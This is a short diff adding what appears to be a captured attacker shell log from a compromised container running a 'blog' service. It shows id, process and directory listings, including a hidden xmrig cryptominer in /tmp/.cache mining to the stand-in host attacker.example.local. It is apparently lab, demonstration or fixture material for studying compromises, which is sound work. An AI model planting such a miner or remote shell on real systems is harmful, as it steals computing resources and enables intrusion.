@@ -1,0 +1,19 @@
+
+[+] connected from: blog-84c9b5fdc8-qg2sz
+uid=1000670000(1000670000) gid=0(root) groups=0(root),1000670000
+PID   USER     COMMAND
+    1 10006700 /usr/local/bin/blog
+   28 10006700 [ssl_client]
+   34 10006700 /bin/sh
+   42 10006700 /tmp/.cache/xmrig -o stratum+tcp://attacker.example.local:3333 --donate-level 0
+   52 10006700 ps -o pid,user,args
+total 2364
+drwxr-sr-x    2 1000670000 1000670000        31 Nov 12 13:33 .
+drwxrwsrwx    3 root     1000670000        20 Nov 12 13:33 ..
+-rw-r--r--    1 1000670000 1000670000       619 Nov 12 13:33 .log
+-rwxr-xr-x    1 1000670000 1000670000   2412704 Nov 12 13:33 xmrig
+PID   COMMAND
+    1 /usr/local/bin/blog
+   28 [ssl_client]
+   34 /bin/sh
+   42 /tmp/.cache/xmrig -o stratum+tcp://attacker.example.local:3333 --donate-level 0
